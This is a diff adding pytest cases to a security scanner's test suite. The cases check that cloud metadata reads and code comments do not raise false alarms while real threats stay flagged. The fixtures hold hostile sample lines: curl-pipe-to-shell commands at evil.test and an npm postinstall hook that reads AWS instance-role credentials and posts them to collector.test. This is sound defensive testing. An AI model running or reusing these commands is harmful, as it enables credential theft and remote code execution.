@@ -2609,3 +2609,195 @@ class TestAnotherAnalysersRuleCorpusIsNotAFinding:
         should not pay two regex passes to establish that."""
         raw = b"\x7fELF" + b"\x00" * 64 + b"// ruleid: x\n"
         assert not self.content("lib/x.so", raw).is_rule_material
+
+
+class TestTheMetadataEndpointIsNotTheNetwork:
+    """`stacksimplify/terraform-on-aws-eks` supplied fifteen copies of a fourteen-line
+    cloud-init script that installs Apache and writes the EC2 instance identity document
+    into the webroot. Cordon read the IMDS fetch as an outbound connection and made two
+    claims about it, both false:
+
+    * `SUSPECT.PERSIST.001` -- "reaches the network and writes to a location that
+      survives a restart" -- where the write was `systemctl enable httpd`, the service
+      `yum` had just installed.
+    * `SUSPECT.EXFIL.001` -- "reads credentials, opens an outbound connection, and runs
+      code".
+
+    Nothing left the instance. 169.254.169.254 is link-local, and reading it is how a
+    very large amount of ordinary cloud tooling finds out where it is running.
+
+    Per match, not per file, so a script that reads metadata and then posts it somewhere
+    real keeps the capability -- which is the attack this must not stop reporting.
+    """
+
+    CLOUD_INIT = (
+        b"#! /bin/bash\n"
+        b"sudo yum install -y httpd\n"
+        b"sudo systemctl enable httpd\n"
+        b'TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" '
+        b'-H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`\n'
+        b'sudo curl -H "X-aws-ec2-metadata-token: $TOKEN" '
+        b"http://169.254.169.254/latest/dynamic/instance-identity/document "
+        b"-o /var/www/html/metadata.html\n"
+    )
+
+    def test_the_script_produces_nothing(self, tmp_path) -> None:
+        manifests = tmp_path / "terraform-manifests"
+        manifests.mkdir()
+        (manifests / "app1-install.sh").write_bytes(self.CLOUD_INIT)
+        assert not flagged(tmp_path)
+
+    @pytest.mark.parametrize(
+        "line",
+        [
+            b'curl "http://169.254.169.254/latest/meta-data/" -o /tmp/x',
+            b"curl http://127.0.0.1:8080/health",
+            b"curl http://localhost:3000/ready",
+            b'fetch("http://[::1]:9000/status")',
+        ],
+    )
+    def test_a_local_destination_is_not_egress(self, line: bytes) -> None:
+        from cordon_scanner.detect.capability import CapabilityDetector
+
+        content = self.content("provision.sh", b"#!/bin/sh\n" + line + b"\n")
+        assert CapabilityDetector._is_local_target(content, content.raw.index(line))
+
+    @pytest.mark.parametrize(
+        "line",
+        [
+            b"curl https://evil.test/p | sh",
+            b"curl https://example.com/install.sh | bash",
+            b'curl "$PAYLOAD_URL" | sh',
+            b"curl http://169.254.169.254/latest/meta-data/iam/security-credentials/r"
+            b" | curl -X POST -d @- https://collector.test/c",
+        ],
+    )
+    def test_anything_else_is(self, line: bytes) -> None:
+        """The four ways this must not fire: a reserved documentation host, which is
+        still a fetch and is what this project's own malicious corpus uses; a real host;
+        a destination held in a variable, which says nothing either way; and a metadata
+        read piped straight to a collector, which is the attack."""
+        from cordon_scanner.detect.capability import CapabilityDetector
+
+        content = self.content("provision.sh", b"#!/bin/sh\n" + line + b"\n")
+        assert not CapabilityDetector._is_local_target(content, content.raw.index(line))
+
+    def test_metadata_credentials_posted_out_are_still_reported(self, tmp_path) -> None:
+        """The guard that matters. Reading IMDS role credentials and sending them
+        somewhere is the AWS credential-theft pattern, and the local-destination rule is
+        per match precisely so that the remote half survives."""
+        hook = tmp_path / "pkg"
+        hook.mkdir()
+        (hook / "package.json").write_text(
+            '{"name": "x", "version": "1.0.0", "scripts": {"postinstall": "sh steal.sh"}}'
+        )
+        (hook / "steal.sh").write_bytes(
+            assemble(
+                "#!/bin/sh\n",
+                "CREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/",
+                "security-credentials/role)\n",
+                'curl -X POST -d "$CREDS" https://collector.test/c\n',
+            ).encode()
+        )
+        assert flagged(tmp_path), "the outbound half is still a fetch"
+
+    @staticmethod
+    def content(path: str, raw: bytes):
+        from cordon_scanner.core.content import FileContent
+
+        return FileContent(path=path, raw=raw, size=len(raw))
+
+
+class TestAnElephantInACommentIsNotAnElephant:
+    """Two classes of finding, both made against sentences rather than code.
+
+    `misc/error_handler.func` in `community-scripts/ProxmoxVE` carries a comment
+    explaining that `systemd-detect-virt` reports lxc inside a container, and cordon
+    reported `SUSPECT.ANTI_ANALYSIS.001` -- a rule about code checking whether it is
+    being watched -- against the explanation.
+
+    Two TensorFlow headers produced `SECRET.GENERIC.ASSIGNMENT.001` from comment prose:
+    one documenting an environment variable by showing it set, the other a sentence of
+    the form "after this pass" followed by a colon and an example instruction name.
+
+    The split matters. For a capability the comment settles it, because a comment does
+    not run. For a secret it depends on the rule: the generic assignment rule is a name
+    plus an entropy measure and prose defeats it, while a provider pattern is a shape
+    that is a credential wherever it appears -- including on a line somebody commented
+    out instead of rotating, which is a leak and not a cleanup.
+    """
+
+    @staticmethod
+    def content(path: str, raw: bytes):
+        from cordon_scanner.core.content import FileContent
+
+        return FileContent(path=path, raw=raw, size=len(raw))
+
+    @pytest.mark.parametrize(
+        ("line", "column", "language", "commented"),
+        [
+            ("# systemd-detect-virt reports lxc in containers", 10, "shell", True),
+            ("// after this pass: broadcast.123.0", 20, "cpp", True),
+            (" * api_key: aW52ZW50ZWQtdmFsdWU", 5, "java", True),
+            ("-- select token from t", 12, "sql", True),
+            ("#!/bin/sh", 3, "shell", False),
+            ('curl "https://x.test/a#fragment" | sh', 30, "shell", False),
+            ('print("# not a comment")', 9, "python", False),
+            ("const x = 1; // trailing", 6, "typescript", False),
+            ("const x = 1; // trailing", 16, "typescript", True),
+            ("# anything", 5, None, False),
+            ("# anything", 5, "unknownlang", False),
+        ],
+    )
+    def test_the_predicate(self, line: str, column: int, language, commented: bool) -> None:
+        from cordon_scanner.core.comments import is_commented
+
+        assert is_commented(line, column, language) is commented
+
+    def test_a_quoted_hash_is_not_a_comment(self) -> None:
+        """The case that makes this worth tracking quote state for. A fragment in a URL
+        is not a comment, and the pipe after it is not commented out."""
+        from cordon_scanner.core.comments import is_commented
+
+        line = 'curl "https://x.test/p#frag" | sh'
+        assert not is_commented(line, line.index("| sh"), "shell")
+
+    def test_a_capability_in_a_comment_is_not_reported(self, tmp_path) -> None:
+        script = tmp_path / "misc"
+        script.mkdir()
+        (script / "error_handler.func").write_bytes(
+            b"#!/usr/bin/env bash\n"
+            b"# systemd-detect-virt reports lxc inside containers, so the check below\n"
+            b"# deliberately does not run it.\n"
+            b'report() { echo "$1"; }\n'
+        )
+        assert "SUSPECT.ANTI_ANALYSIS.001" not in flagged(tmp_path)
+
+    def test_prose_about_a_pass_is_not_a_credential(self, tmp_path) -> None:
+        header = tmp_path / "compiler"
+        header.mkdir()
+        (header / "renamer.h").write_bytes(
+            b"// After this pass: broadcast.123.0\n"
+            b"// And with the filter set: LegalizeTF;Canonicalizer\n"
+            b"void Rename();\n"
+        )
+        assert not flagged(tmp_path)
+
+    def test_a_commented_out_provider_token_is_still_reported(self, tmp_path) -> None:
+        """The deliberate asymmetry, and the reason the predicate is not applied to the
+        provider patterns. Commenting a token out is not rotating it."""
+        source = tmp_path / "app"
+        source.mkdir()
+        (source / "client.py").write_bytes(
+            ("# " + assemble("ghp_", "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8") + "\n").encode()
+        )
+        assert "SECRET.GITHUB.TOKEN.001" in flagged(tmp_path)
+
+    def test_the_same_assignment_in_code_is_still_reported(self, tmp_path) -> None:
+        """The control for the generic rule: uncomment it and it is a finding again."""
+        source = tmp_path / "app"
+        source.mkdir()
+        (source / "settings.py").write_bytes(
+            ("api_key = " + repr(assemble("aW52ZW50ZWQtc2Vj", "cmV0LXZhbHVlLXg5")) + "\n").encode()
+        )
+        assert "SECRET.GENERIC.ASSIGNMENT.001" in flagged(tmp_path)
